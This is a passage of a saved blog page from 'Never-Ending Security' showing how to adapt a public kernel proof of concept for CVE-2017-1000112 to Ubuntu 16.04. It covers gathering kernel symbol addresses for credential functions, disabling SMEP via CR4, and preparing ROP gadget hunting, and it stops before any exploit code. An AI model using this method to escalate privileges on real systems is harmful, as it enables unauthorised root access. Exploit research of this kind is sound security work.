<!DOCTYPE html>
<!-- saved from url=(0082)https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html -->
<html class="v2" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link href="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/1529571102-css_bundle_v2.css" rel="stylesheet" type="text/css">
<meta content="width=1100" name="viewport">

<meta content="blogger" name="generator">
<link href="https://ricklarabee.blogspot.com/favicon.ico" rel="icon" type="image/x-icon">
<link href="https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="Never-Ending Security - Atom" href="https://ricklarabee.blogspot.com/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="Never-Ending Security - RSS" href="https://ricklarabee.blogspot.com/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="Never-Ending Security - Atom" href="https://www.blogger.com/feeds/755044011870705123/posts/default">

<link rel="alternate" type="application/atom+xml" title="Never-Ending Security - Atom" href="https://ricklarabee.blogspot.com/feeds/3659093573996653033/comments/default">
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1155466832-ieretrofit.js"></script>
<![endif]-->
<link href="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/kernel_structure.png" rel="image_src">
<meta content="https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html" property="og:url">
<meta content="Adapting the POC for CVE-2017-1000112 to Other Kernels" property="og:title">
<meta content="This post will show how to adapt Andrey&#39;s @andreyknvl  proof of concent, https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-10001..." property="og:description">
<meta content="https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/w1200-h630-p-k-no-nu/kernel_structure.png" property="og:image">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>Never-Ending Security: Adapting the POC for CVE-2017-1000112 to Other Kernels</title>
<style id="page-skin-1" type="text/css"><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Simple
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Content
----------------------------------------------- */
body {
font: normal normal 12px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #222222;
background: #eeaa00 none repeat scroll top left;
padding: 0 40px 40px 40px;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
h2 {
font-size: 22px;
}
a:link {
text-decoration:none;
color: #cc6611;
}
a:visited {
text-decoration:none;
color: #888888;
}
a:hover {
text-decoration:underline;
color: #ff9900;
}
.body-fauxcolumn-outer .fauxcolumn-inner {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/simple/body_gradient_tile_light.png) repeat scroll top left;
_background-image: none;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 400px;
width: 100%;
}
.body-fauxcolumn-outer .cap-top .cap-left {
width: 100%;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png) repeat-x scroll top left;
_background-image: none;
}
.content-outer {
-moz-box-shadow: 0 0 40px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 5px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 10px #333333;
box-shadow: 0 0 40px rgba(0, 0, 0, .15);
margin-bottom: 1px;
}
.content-inner {
padding: 10px 10px;
}
.content-inner {
background-color: #ffffff;
}
/* Header
----------------------------------------------- */
.header-outer {
background: #cc6611 url(//www.blogblog.com/1kt/simple/gradients_light.png) repeat-x scroll 0 -400px;
_background-image: none;
}
.Header h1 {
font: normal normal 60px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
text-shadow: 1px 2px 3px rgba(0, 0, 0, .2);
}
.Header h1 a {
color: #ffffff;
}
.Header .description {
font-size: 140%;
color: #ffffff;
}
.header-inner .Header .titlewrapper {
padding: 22px 30px;
}
.header-inner .Header .descriptionwrapper {
padding: 0 30px;
}
/* Tabs
----------------------------------------------- */
.tabs-inner .section:first-child {
border-top: 0 solid #eeeeee;
}
.tabs-inner .section:first-child ul {
margin-top: -0;
border-top: 0 solid #eeeeee;
border-left: 0 solid #eeeeee;
border-right: 0 solid #eeeeee;
}
.tabs-inner .widget ul {
background: #f5f5f5 url(https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png) repeat-x scroll 0 -800px;
_background-image: none;
border-bottom: 1px solid #eeeeee;
margin-top: 0;
margin-left: -30px;
margin-right: -30px;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .6em 1em;
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #999999;
border-left: 1px solid #ffffff;
border-right: 1px solid #eeeeee;
}
.tabs-inner .widget li:first-child a {
border-left: none;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
color: #000000;
background-color: #eeeeee;
text-decoration: none;
}
/* Columns
----------------------------------------------- */
.main-outer {
border-top: 0 solid #eeeeee;
}
.fauxcolumn-left-outer .fauxcolumn-inner {
border-right: 1px solid #eeeeee;
}
.fauxcolumn-right-outer .fauxcolumn-inner {
border-left: 1px solid #eeeeee;
}
/* Headings
----------------------------------------------- */
div.widget > h2,
div.widget h2.title {
margin: 0 0 1em 0;
font: normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #000000;
}
/* Widgets
----------------------------------------------- */
.widget .zippy {
color: #999999;
text-shadow: 2px 2px 1px rgba(0, 0, 0, .1);
}
.widget .popular-posts ul {
list-style: none;
}
/* Posts
----------------------------------------------- */
h2.date-header {
font: normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
}
.date-header span {
background-color: transparent;
color: #222222;
padding: inherit;
letter-spacing: inherit;
margin: inherit;
}
.main-inner {
padding-top: 30px;
padding-bottom: 30px;
}
.main-inner .column-center-inner {
padding: 0 15px;
}
.main-inner .column-center-inner .section {
margin: 0 15px;
}
.post {
margin: 0 0 25px 0;
}
h3.post-title, .comments h4 {
font: normal normal 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
margin: .75em 0 0;
}
.post-body {
font-size: 110%;
line-height: 1.4;
position: relative;
}
.post-body img, .post-body .tr-caption-container, .Profile img, .Image img,
.BlogList .item-thumbnail img {
padding: 2px;
background: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
-webkit-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
}
.post-body img, .post-body .tr-caption-container {
padding: 5px;
}
.post-body .tr-caption-container {
color: #222222;
}
.post-body .tr-caption-container img {
padding: 0;
background: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
box-shadow: 0 0 0 rgba(0, 0, 0, .1);
}
.post-header {
margin: 0 0 1.5em;
line-height: 1.6;
font-size: 90%;
}
.post-footer {
margin: 20px -2px 0;
padding: 5px 10px;
color: #666666;
background-color: #f9f9f9;
border-bottom: 1px solid #eeeeee;
line-height: 1.6;
font-size: 90%;
}
#comments .comment-author {
padding-top: 1.5em;
border-top: 1px solid #eeeeee;
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
#comments .avatar-image-container img {
border: 1px solid #eeeeee;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
}
.comments .comment-thread.inline-thread {
background-color: #f9f9f9;
}
.comments .continue {
border-top: 2px solid #999999;
}
/* Accents
---------------------------------------------- */
.section-columns td.columns-cell {
border-left: 1px solid #eeeeee;
}
.blog-pager {
background: transparent none no-repeat scroll top center;
}
.blog-pager-older-link, .home-link,
.blog-pager-newer-link {
background-color: #ffffff;
padding: 5px;
}
.footer-outer {
border-top: 0 dashed #bbbbbb;
}
/* Mobile
----------------------------------------------- */
body.mobile  {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
.mobile .body-fauxcolumn-outer .cap-top {
background-size: 100% auto;
}
.mobile .content-outer {
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
}
.mobile .tabs-inner .widget ul {
margin-left: 0;
margin-right: 0;
}
.mobile .post {
margin: 0;
}
.mobile .main-inner .column-center-inner .section {
margin: 0;
}
.mobile .date-header span {
padding: 0.1em 10px;
margin: 0 -10px;
}
.mobile h3.post-title {
margin: 0;
}
.mobile .blog-pager {
background: transparent none no-repeat scroll top center;
}
.mobile .footer-outer {
border-top: none;
}
.mobile .main-inner, .mobile .footer-inner {
background-color: #ffffff;
}
.mobile-index-contents {
color: #222222;
}
.mobile-link-button {
background-color: #cc6611;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .section:first-child {
border-top: none;
}
.mobile .tabs-inner .PageList .widget-content {
background-color: #eeeeee;
color: #000000;
border-top: 1px solid #eeeeee;
border-bottom: 1px solid #eeeeee;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #eeeeee;
}

--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 960px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 960px;
max-width: 960px;
_width: 960px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 310px;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 310px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("310px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 310px;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 310px;
margin-right: -310px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<link href="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/authorization.css" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;" rel="stylesheet"><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=755044011870705123&amp;zx=3bf81105-7298-4709-a74c-f067887aeb4e' rel='stylesheet'/></noscript>
<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
<meta name="google-adsense-platform-domain" content="blogspot.com">

<script src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/cb=gapi.loaded_2" async=""></script><script type="text/javascript" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/f.txt"></script><style>.gc-bubbleDefault{table-layout:auto!important}.gc-bubbleDefault,.gc-reset{background-color:transparent!important;text-align:left;padding:0!important;margin:0!important;border:0!important}.pls-bubbleTop{border-bottom:1px solid #ccc!important}.pls-contentLeft,.pls-topTail,.pls-vertShimLeft{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/border_3.gif)!important}.pls-topTail{background-repeat:repeat-x!important;background-position:bottom!important}.pls-vertShim{background-color:#fff!important;text-align:right}.tbl-grey .pls-vertShim{background-color:#f5f5f5!important}.pls-vertShimLeft{background-repeat:repeat-y!important;background-position:100%!important;height:4px}.pls-vertShimRight{height:4px}.pls-confirm-container .pls-vertShim{background-color:#fff3c2!important}.pls-contentWrap{background-color:#fff!important;position:relative!important;vertical-align:top}.pls-contentLeft{background-repeat:repeat-y;background-position:100%;vertical-align:top}.pls-dropRight{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropR_3.png)!important;background-repeat:repeat-y!important}.pls-dropBL,.pls-dropBottom,.pls-dropRight,.pls-dropTR .pls-dropBR,.pls-tailleft,.pls-vert,.pls-vert img{vertical-align:top}.pls-dropBottom{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropB_3.png)!important;background-repeat:repeat-x!important;width:100%}.pls-topLeft{text-align:right}.pls-topLeft,.pls-topRight{background:inherit!important;vertical-align:bottom}.pls-topRight{text-align:left}.pls-bottomLeft{background:inherit!important;text-align:right}.pls-bottomRight{background:inherit!important;text-align:left;vertical-align:top}.pls-tailbottom,.pls-tailleft,.pls-tailright,.pls-tailtop{display:none;position:relative}.pls-dropBL,.pls-dropBR,.pls-dropTR,.pls-tailbottom,.pls-tailleft,.pls-tailright,.pls-tailtop{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite_3.png)!important;background-repeat:no-repeat}.tbl-grey .pls-dropBL,.tbl-grey .pls-dropBR,.tbl-grey .pls-dropTR,.tbl-grey .pls-tailbottom,.tbl-grey .pls-tailleft,.tbl-grey .pls-tailright,.tbl-grey .pls-tailtop{background-image:url(//ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite-grey.png)!important}.pls-tailbottom{background-position:-23px 0}.pls-confirm-container .pls-tailbottom{background-position:-23px -10px}.pls-tailtop{background-position:-19px -20px}.pls-tailright{background-position:0 0}.pls-tailleft{background-position:-10px 0}.pls-tailtop{vertical-align:top}.gc-bubbleDefault td{line-height:0;font-size:0}.pls-tailbottom,.pls-topLeft img,.pls-topRight img{vertical-align:bottom}.bubbleDropTR,.pls-bottomLeft,.pls-bottomLeft img,.pls-dropBottom img,.pls-dropBottomL img,.pls-dropBottomR img{vertical-align:top}.pls-dropTR{background-position:0 -22px}.pls-dropBR{background-position:0 -27px}.pls-dropBL{background-position:0 -16px}.pls-spacerbottom,.pls-spacerleft,.pls-spacerright,.pls-spacertop{position:static!important}.pls-spinner{bottom:0;position:absolute;left:0;margin:auto;right:0;top:0}</style><script async="" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/lazy.min.js.下載"></script></head>
<body class=" variant-bold">
<div class="navbar section" id="navbar" name="Navbar"><div class="widget Navbar" data-version="1" id="Navbar1"><script src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/cb=gapi.loaded_1" async=""></script><script src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/cb=gapi(1).loaded_0" async=""></script><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="" tabindex="0" vspace="0" width="100%" id="navbar-iframe" name="navbar-iframe" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/navbar.html"></iframe></div>
<script type="text/javascript" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/plusone.js.下載" gapi_processed="true"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d755044011870705123\x26blogName\x3dNever-Ending+Security\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://ricklarabee.blogspot.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttps://ricklarabee.blogspot.com/\x26targetPostID\x3d3659093573996653033\x26blogPostOrPageUrl\x3dhttps://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html\x26vt\x3d-4546476455036543948',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe"
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header" name="Header"><div class="widget Header" data-version="1" id="Header1">
<div id="header-inner">
<div class="titlewrapper">
<h1 class="title">
<a href="https://ricklarabee.blogspot.com/">
Never-Ending Security
</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>
</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol" name="Cross-Column"><div class="widget PageList" data-version="1" id="PageList1">
<h2>Pages</h2>
<div class="widget-content">
<ul>
<li>
<a href="https://ricklarabee.blogspot.com/">Home</a>
</li>
<li>
<a href="https://ricklarabee.blogspot.com/p/blog-page.html">Training Resources</a>
</li>
</ul>
<div class="clear"></div>
</div>
</div></div>
<div class="tabs no-items section" id="crosscol-overflow" name="Cross-Column 2"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main" name="Main"><div class="widget Blog" data-version="1" id="Blog1">
<div class="blog-posts hfeed">

          <div class="date-outer">
        
<h2 class="date-header"><span>Thursday, December 21, 2017</span></h2>

          <div class="date-posts">
        
<div class="post-outer">
<div class="post hentry uncustomized-post-template" itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<meta content="https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/s640/kernel_structure.png" itemprop="image_url">
<meta content="755044011870705123" itemprop="blogId">
<meta content="3659093573996653033" itemprop="postId">
<a name="3659093573996653033"></a>
<h3 class="post-title entry-title" itemprop="name">
Adapting the POC for CVE-2017-1000112 to Other Kernels
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-3659093573996653033" itemprop="description articleBody">
This post will show how to adapt Andrey's <a href="https://twitter.com/andreyknvl">@andreyknvl</a> proof of concent, <a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c">https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c</a> for CVE-2017-1000112 to other kernels. I will use Ubuntu's Xenial (16.04) kernel version 4.4.0-81-generic in this example<br>
<br>
<a href="http://seclists.org/oss-sec/2017/q3/277">http://seclists.org/oss-sec/2017/q3/277</a><br>
The timeline for discovery and patch:<br>
2017.08.03 - Bug reported to security () kernel org<br>
2017.08.04 - Bug reported to linux-distros@<br>
2017.08.10 - Patch submitted to netdev<br>
2017.08.10 - Announcement on oss-security@<b><br></b><br>
<h3>
Description</h3>
Exploitable memory corruption due to UFO to non-UFO path switch. When building a UFO packet with MSG_MORE __ip_append_data() calls ip_ufo_append_data() to append. However in between two send() calls, the append path can be switched from UFO to non-UFO one, which leads to a memory corruption. In case UFO packet lengths exceeds MTU, copy =&nbsp;&nbsp;&nbsp;&nbsp; maxfraglen - skb-&gt;len becomes negative on the non-UFO path and the branch to allocate new skb is taken. This triggers fragmentation and computation of fraggap = skb_prev-&gt;len - maxfraglen. Fraggap can exceed MTU, causing copy = datalen - transhdrlen - fraggap to become negative. Subsequently skb_copy_and_csum_bits() writes out-of-bounds. A similar issue is present in IPv6 code. The bug was introduced in e89e9cf539a2 ("[IPv4/IPv6]: UFO Scatter-gather approach") on Oct 18 2005.<br>
<br>
<h3>
Fix</h3>
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa">https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa</a><br>
<br>
<br>
<br>
<h2>
Add Offsets for Ubuntu 16.04 with Kernel 4.4.0-81-generic</h2>
<br>
The proof of concept has a nice framework to plugin the address offsets for commit_creds, prepare_kernel_cred, and the gadgets for the ROP chain for different kernels<br>
Looking at the kernel_info structures, we will update this section with our target kernel addresses.<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/s1600/kernel_structure.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="888" data-original-width="1250" height="454" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/kernel_structure.png" width="640"></a></div>
<br>
<br>
<br>
<h3>
Find Kernel Functions</h3>
<br>
To determine the address offsets for commit_creds, prepare_kernel_cred, and the read and write functions for CR4 to disable SMEP.<br>
<br>
<b>Create a target VM based on Ubuntu 16.04.2</b><br>
<br>
I am using VMWare in this example.<br>
<a href="http://old-releases.ubuntu.com/releases/16.04.2/ubuntu-16.04.2-server-amd64.img">http://old-releases.ubuntu.com/releases/16.04.2/ubuntu-16.04.2-server-amd64.img</a><br>
<br>
Since this is a target VM that will be used later in debugging step-through, update the vmx configuration file to enable the kernel debug stub<br>
<br>
<span style="font-size: small;"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">debugStub.listen.guest64 = "TRUE"<br>debugStub.listen.guest64.remote = "TRUE"</span></span><br>
<br>
<b>Install the 4.4.0-81-generic kernel</b><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo apt install linux-image-4.4.0-81-generic</span> <br>
<br>
Once the kernel is installed, reboot and find the addresses for the kernel functions, commit_creds, prepare_kernel_cred, native_read_cr4_safe, and native_write_cr4<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep commit_creds /proc/kallsyms</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep prepare_kernel_cred /proc/kallsyms&nbsp;</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep native_read_cr4_safe /proc/kallsyms<br>sudo grep native_write_cr4 /proc/kallsyms</span><br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://1.bp.blogspot.com/-F5GCJY9KZB8/WjwAtrdH4FI/AAAAAAAAAUA/Clo07er11nIRf3DE0ff4Sl4Wajx4iuxRQCEwYBhgL/s1600/commit_creds.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="122" data-original-width="850" height="90" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/commit_creds.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://3.bp.blogspot.com/-dNjqBtAgLxg/WjwAwTTk6lI/AAAAAAAAAUA/Rr7gwUgIMoAqEHJPLIdjgFnP-ztDRjPBACEwYBhgL/s1600/prepare_kernel_creds.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="92" data-original-width="468" height="77" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/prepare_kernel_creds.png" width="400"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-ETgEHr8NcEw/WjwAvZKyLqI/AAAAAAAAAUA/CdYes9HmlIcUKnDpEwIkfll0QPrajXqKQCEwYBhgL/s1600/kernel_cr4_functions.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="126" data-original-width="860" height="91" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/kernel_cr4_functions.png" width="640"></a></div>
<br>
<h3>
Find ROP Gadgets </h3>
In this example I am using a different VM that will be used to debug the target machine above.<br>
<br>
Once a new VM is created, we can use extract-vmlinux: https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux to extract an uncompressed version of the linux kernel or download the kernel with debug symbols. I am using the kernel with debug symbols as it will be used during walk through of the POC.<br>
<br>
To obtain the kernel with debug symbols<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse<br>deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse<br>deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" | \<br>sudo tee -a /etc/apt/sources.list.d/ddebs.list</span><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 428D7C01 C8CAB6595FDFF622</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br>apt install linux-image-4.4.0-81-generic-dbgsym</span><br>
<br>
The kernel will be installed at /usr/lib/debug/boot/vmlinux-4.4.0-81-generic<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
